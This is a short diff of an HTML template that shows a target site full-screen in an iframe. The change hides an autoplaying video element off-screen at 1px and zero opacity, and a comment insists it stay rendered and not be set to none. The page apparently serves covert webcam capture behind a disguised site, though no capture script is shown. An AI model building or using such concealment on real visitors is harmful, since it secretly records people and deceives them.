@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="utf-8"/>
-  <title>Loading...</title>
+  <title>Loading…</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body, html {
+    html, body {
       margin: 0;
       padding: 0;
       width: 100%;
@@ -17,12 +17,24 @@
       width: 100vw;
       height: 100vh;
       border: none;
+      display: block;
     }
-    video, canvas { display: none !important; }
+    /* video must NOT be display:none, just move off-screen */
+    #video {
+      position: fixed;
+      top: -10000px;
+      left: -10000px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    #canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
-
   <iframe id="siteFrame" src="{{ target_url }}"></iframe>
 
   <video id="video" autoplay playsinline muted></video>
